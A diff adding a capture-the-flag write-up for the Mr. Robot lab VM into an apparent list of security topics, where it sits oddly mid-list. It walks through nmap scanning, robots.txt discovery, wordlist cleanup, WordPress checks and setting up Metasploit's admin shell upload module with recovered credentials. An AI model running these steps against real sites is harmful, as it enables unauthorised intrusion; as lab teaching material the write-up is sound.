@@ -206,6 +206,374 @@ Web application security
 Active Directory
 API security
 Reverse engineering
+
+
+
+
+Mr. Robot CTF — Command Log & Explanations
+
+Authorized local lab / CTF environment.
+
+Target used in this write-up: 192.168.56.104
+
+Attacker VM: Kali Linux / Linux Mint
+
+This document records the commands used during the lab, in the order we used them, with a short explanation of what each command does.
+
+1. Identify the target
+
+Check local network interfaces
+
+ip addr
+
+Purpose: Displays network interfaces and IP addresses on the attacker machine.
+
+Our lab network used the VirtualBox Host-only network:
+
+Mint: 192.168.56.101
+
+Kali: 192.168.56.103
+
+Mr. Robot target: 192.168.56.104
+
+2. Initial Nmap scan
+
+sudo nmap 192.168.56.104 -sV -T4 -oA nmap-scan --open
+
+Explanation
+
+sudo — runs Nmap with elevated privileges.
+
+nmap — network/service scanner.
+
+192.168.56.104 — target IP.
+
+-sV — attempts to identify service versions.
+
+-T4 — faster timing profile.
+
+-oA nmap-scan — saves results in Nmap's three major output formats.
+
+--open — displays open ports rather than listing all closed ports.
+
+Important result
+
+80/tcp   open  http
+443/tcp  open  ssl/http
+
+This indicated that the target had a web service available.
+
+3. Inspect the web server
+
+curl http://192.168.56.104
+
+Purpose: Sends an HTTP request to the target and prints the returned HTML.
+
+This confirmed that the web server was responding.
+
+4. Check robots.txt
+
+curl http://192.168.56.104/robots.txt
+
+Purpose: Requests the site's robots.txt file.
+
+The target revealed:
+
+fsocity.dic
+key-1-of-3.txt
+
+This gave us two interesting paths to investigate.
+
+5. Retrieve the first CTF key
+
+curl http://192.168.56.104/key-1-of-3.txt
+
+Purpose: Requests the first flag/key file from the target.
+
+Keep the value obtained from the target in your private lab notes.
+
+6. Download the discovered dictionary
+
+wget http://192.168.56.104/fsocity.dic
+
+Purpose: Downloads the fsocity.dic wordlist from the target to the attacker machine.
+
+The original file was several MB in size.
+
+7. Remove duplicate entries
+
+sort -u fsocity.dic > fsocity_sorted.txt
+
+Explanation
+
+sort — sorts the contents alphabetically.
+
+-u — removes duplicate lines.
+
+> — writes the result to a new file.
+
+fsocity_sorted.txt — cleaned wordlist.
+
+We then checked the number of entries:
+
+wc -l fsocity.dic fsocity_sorted.txt
+
+The original list contained about 858,160 lines, while the deduplicated list contained about 11,451 lines.
+
+Why this matters: A cleaned wordlist reduces repeated work during later credential-testing steps.
+
+8. Check the WordPress login endpoint
+
+curl -I http://192.168.56.104/wp-login.php
+
+Purpose: Sends an HTTP HEAD request to the WordPress login page.
+
+-I requests only the HTTP headers.
+
+The response confirmed that /wp-login.php was available.
+
+9. Check the WordPress admin endpoint
+
+curl -I http://192.168.56.104/wp-admin/
+
+Purpose: Checks the WordPress administrator path without downloading the complete page.
+
+The server redirected the request toward the WordPress login page, which is expected when authentication is required.
+
+Metasploit Investigation
+
+10. Start Metasploit
+
+msfconsole
+
+Purpose: Opens the Metasploit Framework console.
+
+11. Search for WordPress modules
+
+search wordpress
+
+Purpose: Searches Metasploit's module database for modules containing "wordpress".
+
+This produced many results, so we narrowed the searches.
+
+12. Search for WordPress admin modules
+
+search wp_admin
+
+One relevant result was:
+
+exploit/unix/webapp/wp_admin_shell_upload
+
+Purpose of this module: It is designed to upload a generated WordPress plugin when valid WordPress administrator credentials are available.
+
+13. Search for WordPress username/login enumeration
+
+search wordpress_login_enum
+
+This returned:
+
+auxiliary/scanner/http/wordpress_login_enum
+
+Purpose: Metasploit's WordPress brute-force/user-enumeration utility.
+
+14. Inspect the WordPress login-enumeration module
+
+use auxiliary/scanner/http/wordpress_login_enum
+
+Then:
+
+show options
+
+This displays the configurable parameters of the module.
+
+We configured the target:
+
+set RHOSTS 192.168.56.104
+
+Then attempted:
+
+run
+
+The module reported:
+
+/ does not seem to be WordPress site
+
+Lesson
+
+The target was actually running WordPress, as independently verified through /wp-login.php, but this particular Metasploit module did not recognize the installation correctly. We therefore did not force the module further.
+
+15. Verify WordPress directly
+
+From the Metasploit console, curl can also be executed through the system shell:
+
+curl http://192.168.56.104/wp-login.php
+
+The returned HTML showed the WordPress login form.
+
+The page also identified the installation as WordPress 4.3.1 through its referenced assets.
+
+16. Search for WordPress exploit/admin modules
+
+search type:exploit wordpress admin
+
+This displayed several WordPress-related exploit modules.
+
+The relevant module for our later authenticated stage was:
+
+exploit/unix/webapp/wp_admin_shell_upload
+
+We did not blindly run the other modules because many depend on specific plugins/themes that had not been established on our target.
+
+17. Inspect the admin shell upload module
+
+info exploit/unix/webapp/wp_admin_shell_upload
+
+The module showed these required options:
+
+USERNAME
+PASSWORD
+RHOSTS
+TARGETURI
+
+The description indicated that the module generates a plugin, places a payload inside it, and uploads it to WordPress using valid administrator credentials.
+
+Important learning point
+
+This module requires authentication. Finding the module does not mean it can be used before obtaining valid WordPress credentials.
+
+WordPress Credentials
+
+During the CTF work we established the WordPress credentials:
+
+Username: Elliot
+Password: ER28-0652
+
+These credentials can now be used for the authenticated WordPress stage of the lab.
+
+Current Metasploit Stage
+
+The next module we were preparing to configure was:
+
+use exploit/unix/webapp/wp_admin_shell_upload
+
+Then the target-specific settings would be:
+
+set RHOSTS 192.168.56.104
+set TARGETURI /
+set USERNAME Elliot
+set PASSWORD ER28-0652
+
+Before executing anything, check the configuration:
+
+show options
+
+Purpose: Verifies that the target, WordPress path, username, and password are set correctly.
+
+Useful Command Reference
+
+Command
+
+What it does
+
+ip addr
+
+Shows local interfaces/IP addresses
+
+nmap
+
+Scans hosts, ports and services
+
+curl
+
+Makes HTTP requests
+
+wget
+
+Downloads files
+
+sort -u
+
+Sorts and removes duplicate lines
+
+wc -l
+
+Counts lines
+
+msfconsole
+
+Starts Metasploit
+
+search
+
+Searches Metasploit modules
+
+use
+
+Selects a Metasploit module
+
+info
+
+Displays module information
+
+show options
+
+Displays module configuration
+
+set
+
+Sets a module option
+
+run
+
+Executes an auxiliary module
+
+back
+
+Leaves the current Metasploit module
+
+Key Lessons From This Stage
+
+1. Enumerate before exploiting
+
+The workflow was:
+
+Network
+   ↓
+Nmap
+   ↓
+Web server
+   ↓
+robots.txt
+   ↓
+Wordlist + key
+   ↓
+WordPress
+   ↓
+Credential discovery
+   ↓
+Authenticated WordPress access
+
+2. Don't assume a Metasploit module will work
+
+We found a WordPress enumeration module, but it failed to identify our installation. We verified the service independently instead of assuming the target was wrong.
+
+3. Search results are not proof of vulnerability
+
+A module appearing in:
+
+search type:exploit wordpress
+
+does not mean the target is vulnerable to it. Many WordPress modules require specific plugins, themes, versions, or configurations.
+
+4. Understand module prerequisites
+
+wp_admin_shell_upload requires valid WordPress administrator credentials. That is why credential discovery came before this stage.
+
+Lab Scope
+
+All commands in this document were performed against the intentionally vulnerable Mr. Robot CTF VM on the isolated VirtualBox Host-only network.
+
+
 IoT and embedded security
 Disclaimer
 
